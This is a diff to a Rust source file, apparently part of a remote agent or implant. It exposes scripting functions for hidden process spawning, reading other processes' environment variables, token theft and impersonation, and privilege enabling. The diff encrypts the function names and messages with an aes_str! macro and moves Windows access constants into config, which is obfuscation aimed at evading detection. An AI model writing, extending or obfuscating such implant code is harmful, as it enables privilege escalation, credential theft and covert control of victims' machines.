@@ -1,59 +1,64 @@
 // src/agent/scripting/process.rs
 use rhai::Engine;
 use super::helpers::{kill_pid, proc_env, spawn_hidden};
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 pub fn register(engine: &mut Engine) {
 
     // ── Process control ───────────────────────────────────────────────────────
 
-    engine.register_fn("internal_proc_kill", |pid_str: &str| -> String {
+    engine.register_fn(&aes_str!("internal_proc_kill"), |pid_str: &str| -> String {
         match pid_str.parse::<u32>() {
             Ok(pid) => kill_pid(pid),
-            Err(_)  => "Error: invalid PID".to_string(),
+            Err(_)  => aes_str!("Error: invalid PID"),
         }
     });
 
     // Spawn a process without a visible window (CREATE_NO_WINDOW on Windows).
     // args_json: JSON array of strings, e.g. ["-c", "whoami"].
-    engine.register_fn("internal_spawn_hidden", |binary: &str, args_json: &str| -> String {
+    engine.register_fn(&aes_str!("internal_spawn_hidden"), |binary: &str, args_json: &str| -> String {
         spawn_hidden(binary, args_json)
     });
 
     // Read another process's environment variables.
     // Linux: reads /proc/{pid}/environ |  Other platforms: returns error.
-    engine.register_fn("internal_proc_env", |pid_str: &str| -> String {
+    engine.register_fn(&aes_str!("internal_proc_env"), |pid_str: &str| -> String {
         match pid_str.parse::<u32>() {
             Ok(pid) => proc_env(pid),
-            Err(_)  => "Error: invalid PID".to_string(),
+            Err(_)  => aes_str!("Error: invalid PID"),
         }
     });
 
     // ── Token / privilege (Windows: real API; POSIX: lightweight equivalents) ─
 
-    engine.register_fn("internal_is_elevated", || -> String {
+    engine.register_fn(&aes_str!("internal_is_elevated"), || -> String {
         #[cfg(target_os = "windows")]
-        { if unsafe { super::win_ffi::win_ext::IsUserAnAdmin() } != 0 { "true".into() } else { "false".into() } }
+        { if unsafe { super::win_ffi::win_ext::IsUserAnAdmin() } != 0 { aes_str!("true") } else { aes_str!("false") } }
         #[cfg(not(target_os = "windows"))]
-        { if unsafe { libc::geteuid() } == 0 { "true".into() } else { "false".into() } }
+        { if unsafe { libc::geteuid() } == 0 { aes_str!("true") } else { aes_str!("false") } }
     });
 
     // Duplicate the token of a running process and impersonate it.
     // Windows only - no-op stub on other platforms.
-    engine.register_fn("internal_token_steal", |pid_str: &str| -> String {
+    engine.register_fn(&aes_str!("internal_token_steal"), |pid_str: &str| -> String {
         #[cfg(target_os = "windows")]
         {
             let pid: u32 = match pid_str.parse() {
                 Ok(p)  => p,
-                Err(_) => return "Error: invalid PID".into(),
+                Err(_) => return aes_str!("Error: invalid PID"),
             };
             unsafe {
                 use super::win_ffi::win_ext::*;
-                let h_proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
+                let h_proc = OpenProcess(
+                    crate::config::config().ffi_windows.process_all_access, 0, pid);
                 if h_proc.is_null() {
                     return format!("Error: OpenProcess failed ({})", GetLastError());
                 }
                 let mut h_tok: HANDLE = std::ptr::null_mut();
-                if OpenProcessToken(h_proc, TOKEN_DUPLICATE | TOKEN_QUERY, &mut h_tok) == 0 {
+                if OpenProcessToken(h_proc,
+                    TOKEN_DUPLICATE | crate::config::config().ffi_windows.token_query,
+                    &mut h_tok) == 0 {
                     CloseHandle(h_proc);
                     return format!("Error: OpenProcessToken failed ({})", GetLastError());
                 }
@@ -79,19 +84,21 @@ pub fn register(engine: &mut Engine) {
 
     // Enable an SE_* privilege on the current process token.
     // Windows only - no-op stub on other platforms.
-    engine.register_fn("internal_enable_privilege", |priv_name: &str| -> String {
+    engine.register_fn(&aes_str!("internal_enable_privilege"), |priv_name: &str| -> String {
         #[cfg(target_os = "windows")]
         {
             use std::ffi::CString;
             let name = match CString::new(priv_name) {
                 Ok(s)  => s,
-                Err(_) => return "Error: invalid privilege name".into(),
+                Err(_) => return aes_str!("Error: invalid privilege name"),
             };
             unsafe {
                 use super::win_ffi::win_ext::*;
                 let mut h_tok: HANDLE = std::ptr::null_mut();
                 if OpenProcessToken(
-                    GetCurrentProcess(), TOKEN_ADJUST_PRIVS | TOKEN_QUERY, &mut h_tok,
+                    GetCurrentProcess(),
+                    TOKEN_ADJUST_PRIVS | crate::config::config().ffi_windows.token_query,
+                    &mut h_tok,
                 ) == 0 {
                     return format!("Error: OpenProcessToken failed ({})", GetLastError());
                 }
